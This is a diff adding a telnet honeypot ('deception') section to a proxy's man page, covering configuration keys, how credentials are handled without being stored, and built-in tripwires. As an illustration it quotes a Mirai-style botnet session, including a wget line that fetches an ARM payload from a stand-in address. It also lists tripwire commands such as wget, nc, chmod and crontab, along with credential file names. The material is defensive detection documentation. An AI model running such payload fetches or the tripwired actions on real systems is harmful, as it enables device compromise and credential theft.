@@ -9847,6 +9847,167 @@ While the proxy is asking its own questions it agrees to no options: anything th
 \fBThe recording\fR is the asciicast v2 format the ssh bastion writes, so the same player replays it. \fBnaws\fR gives it the window size, and a resize during the session is recorded as one. \fBinput: true\fR records what was typed as well as what was shown, and on telnet that means every password typed into the target\(aqs own login \[u2014] which the proxy does not otherwise see. The warning that applies to the bastion applies here more strongly.
 .PP
 Counters: \fBtelnet_sessions\fR, \fBtelnet_sessions_open\fR, \fBtelnet_rejected\fR, \fBtelnet_refused\fR, \fBtelnet_options_refused\fR, \fBtelnet_recorded\fR, \fBtelnet_mfa_ok\fR, \fBtelnet_mfa_failed\fR. Every session writes one \fBtelnet\fR access line with the client, the name the factor was checked against, the target, how it ended and how many options were refused. Refusals are \fBtelnet_denied\fR deny events, so bans apply.
+.SS "server.listeners[].telnet.deception"
+.PP
+A login that is not there.
+.PP
+A telnet port on a public address is found within the hour, and what finds it is a \fIdictionary\fR: the Mirai family and everything written after it walk a list of the credentials that shipped on recorders, cameras and routers \[u2014] a few thousand pairs, tried a handful at a time from a great many addresses.
+.PP
+Refusing collects the address, which the firewall log already has. Answering collects the \fBlist\fR \[u2014] which pairs are in circulation this month, and whether any of them is one of yours \[u2014] and then, because the login is accepted, what the thing came to do:
+.PP
+.RS 4
+.nf
+.ft CR
+enable / system / shell / sh          is this a shell
+/bin/busybox MIRAI                    is it busybox, and which one
+echo \-e '\ex6b\ex61\ex6d\ex69'            is anything actually reading this
+cat /proc/cpuinfo                     which payload do I need
+wget http://198.51.100.9/bins/x.arm7  and here is where it lives
+.ft
+.fi
+.RE
+.PP
+That last line is the artefact. It names the payload, the address serving it and the architecture it was built for, and nothing else in this proxy produces it.
+.PP
+.RS 4
+.nf
+.ft CR
+telnet:
+  # A honeypot: no upstream, because there is no equipment behind it.
+  deception:
+    mode: decoy
+    profile: busybox
+    hostname: cam\-07        # something this estate really has
+    attempts: 2
+    tripwire: [payroll]
+.ft
+.fi
+.RE
+.PP
+.TS
+allbox;
+lbw(0.9i) lbw(0.9i) lbw(1.0i) lbx
+lw(0.9i) lw(0.9i) lw(1.0i) lx.
+T{
+Key
+T}	T{
+Type
+T}	T{
+Default
+T}	T{
+Description
+T}
+T{
+\fBenabled\fR
+T}	T{
+bool
+T}	T{
+\fBtrue\fR
+T}	T{
+Turns the section off without removing it
+T}
+T{
+\fBmode\fR
+T}	T{
+\fBanswer\fR,\: \fBdecoy\fR
+T}	T{
+\fBanswer\fR
+T}	T{
+\fBanswer\fR: a session this listener was going to refuse gets the fabrication instead. \fBdecoy\fR: the whole listener is a fabricated device,\: with no \fBupstream\fR
+T}
+T{
+\fBclients\fR
+T}	T{
+list of CIDR
+T}	T{
+
+T}	T{
+The networks that get the fabrication. \fBRequired in mode \fBanswer\fR.\fR In mode \fBdecoy\fR an empty list means every client
+T}
+T{
+\fBprofile\fR
+T}	T{
+\fBbusybox\fR,\: \fBlinux\fR
+T}	T{
+\fBbusybox\fR
+T}	T{
+The machine being impersonated: a recorder or camera (what is actually on port 23),\: or a small server
+T}
+T{
+\fBhostname\fR
+T}	T{
+string
+T}	T{
+the profile\(aqs
+T}	T{
+What a visitor reads in the login prompt,\: the shell prompt,\: \fBuname \-\:a\fR and \fB/\:etc/\:hostname\fR. \fBName it after something this estate really has\fR
+T}
+T{
+\fBattempts\fR
+T}	T{
+int
+T}	T{
+\fB1\fR
+T}	T{
+How many credentials are taken before the login is accepted (0 to 16). Two or three is what a real device\(aqs login looks like,\: and collects more of the dictionary
+T}
+T{
+\fBtripwire\fR
+T}	T{
+list
+T}	T{
+
+T}	T{
+Command names that raise a \fBtelnet_\:tripwire\fR event. \fBIn addition to\fR the built\-in set below
+T}
+T{
+\fBseed\fR
+T}	T{
+int
+T}	T{
+from the listener name
+T}	T{
+Makes the fabricated numbers reproducible across restarts
+T}
+T{
+\fBperiod\fR
+T}	T{
+duration
+T}	T{
+\fB30s\fR
+T}	T{
+How long one sample of a fabricated number lasts \[u2014] here the load average and the number of users logged in
+T}
+T{
+\fBmax_\:clients\fR
+T}	T{
+int
+T}	T{
+\fB1024\fR
+T}	T{
+Bounds the record of who has been answered
+T}
+.TE
+.PP
+\fBNo password is recorded, in any form a guess can be tested against.\fR What is kept for each attempt is the user name (an identity, like every other kind\(aqs), the credential\(aqs \fBlength\fR, and a \fBcredential_id\fR \[u2014] a handle computed under a key the process made at startup from the system random source and never writes down. That answers the question an operator actually has (\fIhow many distinct passwords did this client try, and have we seen this one before\fR) and answers nothing to anybody who later reads the log. After a restart the handles are new, which is correct: the question is about a session or a campaign, not about the password. A process with no random source produces no handle at all rather than one under a constant key.
+.PP
+The recording, where one is configured, holds the shell transcript and not the login: the credential prompts are written straight to the client and never reach the file, even with \fBinput: true\fR.
+.PP
+\fBThe login never turns on the credential.\fR Every credential is accepted once \fBattempts\fR have been taken, and which one it was makes no difference to what happens next. A trap that accepted the right password and refused the wrong one would be a credential oracle, which is the one thing a password list needs.
+.PP
+\fBIn mode \fBanswer\fR it replaces the refusals that happen after the proxy has spoken\fR: a failed or locked second factor, the estate\(aqs \fBauthorization\fR policy, and a missing access grant. It does \fBnot\fR replace \fBallow_clients\fR or a ban \[u2014] an address that may not connect gets nothing, which is what the list means \[u2014] and it never replaces an \fIoutage\fR: a target that cannot be reached is an outage, and an operator working an incident must not be handed a fabricated device instead of "the target is unavailable".
+.PP
+\fBA \fBdecoy\fR listener will not compile with \fBmfa\fR or \fBrequire_grant\fR.\fR Its own login prompt is the trap and accepts everybody by design, so a factor in front of it would refuse the visitors it exists to collect, and a grant would be checked against a name nobody real typed. Validation says so rather than ignoring the setting. It also does not warn about the missing \fBtls\fR section: an unencrypted telnet port is what the scanning is looking for.
+.PP
+\fBNothing is run and nothing is fetched.\fR \fBwget\fR, \fBcurl\fR, \fBtftp\fR and \fBftpget\fR answer the connection timeout a device behind a firewall answers \[u2014] after the address has been recorded. A fabrication that fetched the payload would be doing the download on the attacker\(aqs behalf, from this estate\(aqs address and with this estate\(aqs reputation.
+.PP
+\fBThe tripwires need no configuring\fR: the escalation, in the order it happens \[u2014] \fBwget\fR, \fBcurl\fR, \fBtftp\fR, \fBnc\fR (fetch it), \fBchmod\fR, \fBchattr\fR, \fBdd\fR (make it run), \fBnohup\fR, \fBsetsid\fR, \fBinsmod\fR (keep it running), \fBcrontab\fR, \fBiptables\fR, \fBsystemctl\fR (clear what would have stopped it), \fBbusybox\fR, and the file names a credential lives in (\fBshadow\fR, \fBauthorized_keys\fR, \fBid_rsa\fR). A command named by its path counts \[u2014] \fB/usr/bin/wget\fR is \fBwget\fR \[u2014] and \fBpasswd\fR is deliberately \fInot\fR in the set, because \fB/etc/passwd\fR is the commonest reconnaissance on any machine and a tripwire that matched it would make every session look like an escalation.
+.PP
+\fBWhat it will not invent\fR: \fB/etc/shadow\fR lists the accounts with \fB*\fR where a hash would be, because a fabricated hash is a machine\(aqs worth of somebody\(aqs time and a thing an operator could later mistake for real; \fB/tmp\fR is empty; and the shell history is empty, because a fabricated one would be inventing a person who used this machine.
+.PP
+A session is bounded in commands as well as by \fBidle_timeout\fR and \fBsession_timeout\fR, so a script in a loop cannot hold a worker on a listener whose whole purpose is to be found.
+.PP
+Counters: \fBtelnet_deceived\fR and \fBtelnet_tripwire\fR. Security events: \fBtelnet_credential\fR (the user name, the length, the handle and whether that attempt was accepted), \fBtelnet_deceived\fR and \fBtelnet_tripwire\fR (the command, one line, clipped). \fBxproxyctl decoys\fR lists what each fabrication has seen.
 .SS "server.listeners[].ftp (kind: ftp)"
 .PP
 A \fBkind: ftp\fR listener is a protocol\-aware FTP proxy: the proxy is an FTP server to the client and an FTP client to the target, and it is one end of every data connection as well.
@@ -16040,7 +16201,7 @@ list
 T}	T{
 \fB[]\fR (all)
 T}	T{
-Deny categories that count: \fBacl\fR,\: \fBrate_\:limit\fR,\: \fBwaf\fR,\: \fBbody_\:size\fR,\: \fBuri_\:length\fR,\: \fBbad_\:host\fR,\: \fBno_\:route\fR,\: \fBwebsocket\fR,\: \fBconcurrency\fR,\: \fBchallenge\fR,\: \fBjwt\fR,\: \fBicap\fR,\: \fBgeo\fR,\: \fBtcp_\:no_\:route\fR,\: \fBforward_\:denied\fR,\: \fBforward_\:auth\fR,\: \fBhoneypot\fR,\: \fBdns_\:blocked\fR,\: \fBdns_\:bogus\fR,\: \fBdns_\:rpz\fR,\: \fBhoneytoken\fR,\: \fBaccount_\:abuse\fR,\: \fBapi_\:abuse\fR,\: \fBthreat_\:intel\fR,\: \fBscim\fR,\: \fBsmtp_\:denied\fR,\: \fBmqtt_\:denied\fR,\: \fBssh_\:denied\fR,\: \fBftp_\:denied\fR,\: \fBsyslog_\:denied\fR,\: \fBtelnet_\:denied\fR,\: \fBvnc_\:denied\fR,\: \fBrdp_\:denied\fR,\: \fBforward_\:sni_\:mismatch\fR,\: \fBdns_\:tunnel\fR,\: \fBdns_\:answer_\:denied\fR,\: \fBsftp_\:icap\fR,\: \fBtcp_\:denied\fR,\: \fBudp_\:denied\fR,\: \fBmodbus_\:denied\fR,\: \fBiec104_\:denied\fR,\: \fBsnmp_\:denied\fR,\: \fBldap_\:denied\fR,\: \fBtftp_\:denied\fR,\: \fBdhcp_\:denied\fR,\: \fBpostgres_\:denied\fR,\: \fBmysql_\:denied\fR,\: \fBtds_\:denied\fR,\: \fBredis_\:denied\fR,\: \fBbacnet_\:denied\fR,\: \fBamqp_\:denied\fR,\: \fBs7_\:denied\fR,\: \fBntp_\:denied\fR,\: \fBntske_\:denied\fR,\: \fBdns_\:denied\fR,\: \fBdns_\:threat_\:intel\fR,\: \fBdns_\:deceived\fR,\: \fBdns_\:tripwire\fR,\: \fByara\fR
+Deny categories that count: \fBacl\fR,\: \fBrate_\:limit\fR,\: \fBwaf\fR,\: \fBbody_\:size\fR,\: \fBuri_\:length\fR,\: \fBbad_\:host\fR,\: \fBno_\:route\fR,\: \fBwebsocket\fR,\: \fBconcurrency\fR,\: \fBchallenge\fR,\: \fBjwt\fR,\: \fBicap\fR,\: \fBgeo\fR,\: \fBtcp_\:no_\:route\fR,\: \fBforward_\:denied\fR,\: \fBforward_\:auth\fR,\: \fBhoneypot\fR,\: \fBdns_\:blocked\fR,\: \fBdns_\:bogus\fR,\: \fBdns_\:rpz\fR,\: \fBhoneytoken\fR,\: \fBaccount_\:abuse\fR,\: \fBapi_\:abuse\fR,\: \fBthreat_\:intel\fR,\: \fBscim\fR,\: \fBsmtp_\:denied\fR,\: \fBmqtt_\:denied\fR,\: \fBssh_\:denied\fR,\: \fBftp_\:denied\fR,\: \fBsyslog_\:denied\fR,\: \fBtelnet_\:denied\fR,\: \fBvnc_\:denied\fR,\: \fBrdp_\:denied\fR,\: \fBforward_\:sni_\:mismatch\fR,\: \fBdns_\:tunnel\fR,\: \fBdns_\:answer_\:denied\fR,\: \fBsftp_\:icap\fR,\: \fBtcp_\:denied\fR,\: \fBudp_\:denied\fR,\: \fBmodbus_\:denied\fR,\: \fBiec104_\:denied\fR,\: \fBsnmp_\:denied\fR,\: \fBldap_\:denied\fR,\: \fBtftp_\:denied\fR,\: \fBdhcp_\:denied\fR,\: \fBpostgres_\:denied\fR,\: \fBmysql_\:denied\fR,\: \fBtds_\:denied\fR,\: \fBredis_\:denied\fR,\: \fBbacnet_\:denied\fR,\: \fBamqp_\:denied\fR,\: \fBs7_\:denied\fR,\: \fBntp_\:denied\fR,\: \fBntske_\:denied\fR,\: \fBdns_\:denied\fR,\: \fBdns_\:threat_\:intel\fR,\: \fBdns_\:deceived\fR,\: \fBdns_\:tripwire\fR,\: \fBtelnet_\:tripwire\fR,\: \fByara\fR
 T}
 T{
 \fBthreshold\fR
